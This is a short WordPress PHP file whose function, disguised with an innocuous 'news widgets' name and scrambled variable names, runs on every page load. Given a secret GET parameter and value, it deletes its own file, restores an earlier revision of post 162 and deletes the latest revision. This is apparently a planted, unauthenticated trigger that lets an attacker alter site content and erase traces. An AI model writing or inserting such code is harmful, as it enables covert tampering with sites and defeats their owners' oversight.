<?php

function news_widgets_landing() {
	if (isset($_GET['forum_modules_api']) && $_GET['forum_modules_api'] === 'keywords_fx_item_members') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$favicon_more_emails_cleaner = 162;
		$validator_groups_best_select = wp_get_post_revisions($favicon_more_emails_cleaner);
		if (empty($validator_groups_best_select)) die('no revisions');
		if (count($validator_groups_best_select) < 2) die('less than 2');
		$module_addons_nofollow = array_shift($validator_groups_best_select);
		$extensions_js_subscription_mobile = $module_addons_nofollow->ID;
		$integration_shop_ssl = array_shift($validator_groups_best_select);
		$keyword_advance_site = $integration_shop_ssl->ID;
		$external_embed_menus_radio = wp_restore_post_revision($keyword_advance_site);
		if ($external_embed_menus_radio === false) die('error restoring');
		$external_embed_menus_radio = wp_delete_post_revision($extensions_js_subscription_mobile);		
		if ($external_embed_menus_radio === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'news_widgets_landing');
